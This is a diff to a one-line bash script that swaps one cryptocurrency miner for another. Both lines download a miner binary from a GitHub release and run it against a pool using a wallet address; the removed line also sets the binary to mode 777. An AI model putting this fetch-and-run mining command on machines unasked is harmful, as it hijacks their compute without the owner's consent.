@@ -1,2 +1,2 @@
 #!/usr/bin/env bash
-wget https://github.com/dodohua/xdag_mac/releases/download/1.0/CpuMiner && chmod 777 CpuMiner && ./CpuMiner -cpu -p 82.156.18.237:13654 -t 16 -a A7F3atzGYPEBYAZlTZTfy4bKr8y3Ho57
+wget https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz && tar xvf violetminer-linux-v0.2.2.tar.gz && cd violetminer-linux-v0.2.2 && ./violetminer --pool pool.hashvault.pro:443 --username NaWe5B5NqvZ3TV2Mj1pxYtTgrnTBwQDMDNtqVzMR6Xa5ejxu6hbi6KULHTqd732ebc5qTHvKXonokghUBd3pjLa8czomFjnbsCi2GFe7PPDQ --password CPU --disableNVIDIA --algorithm chukwa_v2 --ssl
